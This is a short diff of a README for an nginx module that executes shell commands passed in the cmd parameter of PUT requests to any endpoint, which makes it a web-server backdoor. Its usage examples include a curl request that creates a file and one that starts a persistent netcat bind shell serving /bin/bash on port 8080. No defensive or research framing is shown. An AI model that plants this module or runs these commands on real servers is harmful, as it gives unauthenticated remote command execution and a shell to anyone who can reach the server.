@@ -14,7 +14,9 @@ Module allows for command execution using PUT requests to any endpoint on an ngi
 ## Use
 After the server is setup, the module can be utilized with a PUT request including the cmd parameter.
 Example:
+
 `curl -X PUT http://localhost/?cmd=/usr/bin/touch%20/tmp/testfile`
+
 `curl -X PUT http://localhost/?cmd=nohup%20nc%20-lvnp%208080%20-e%20/bin/bash`
 
 
